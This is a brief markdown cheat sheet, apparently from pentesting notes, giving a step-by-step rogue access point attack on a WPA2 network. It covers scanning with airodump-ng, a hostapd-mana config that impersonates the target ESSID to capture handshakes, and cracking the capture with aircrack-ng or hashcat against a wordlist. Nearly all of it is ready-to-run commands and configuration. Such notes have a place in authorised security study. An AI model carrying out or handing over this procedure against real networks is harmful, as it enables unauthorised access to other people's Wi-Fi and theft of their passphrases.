## Rogue Access Point

```text
sudo apt install hostapd-mana
```

```text
sudo airodump-ng wlan0mon

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID 
11:22:33:44:55:66  -68       12        1    0   1  130   WPA2 CCMP   PSK  linksys
```

At this point we know the following about our target AP:


It has an ESSID of linksys

It has a BSSID of 11:22:33:44:55:66

It uses WPA2 (TKIP/CCMP) (and probably WPA (TKIP/CCMP))

It uses a auth of PSK

It runs on channel 1


#### Create Configuration file
```text
cat linksys-mana.conf

interface=wlan0
ssid=linksys
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/<name>/linksys.hccapx
```

#### Start Access Point
```text
sudo ip link set wlan0 up	
sudo hostapd-mana linksys-mana.conf
```

Wait for Captured a WPA/2 handshake in output


#### Crack!
```text
aircrack-ng linksys.hccapx -e linksys -w /usr/share/john/password.lst

or ...

hcxhash2cap --hccapx=linksys.hccapx -c out.cap
hcxpcapngtool -o hash.hc22000 -E wordlist out.cap
hashcat -m 22000 hash.hc22000 /usr/share/john/password.lst
```text



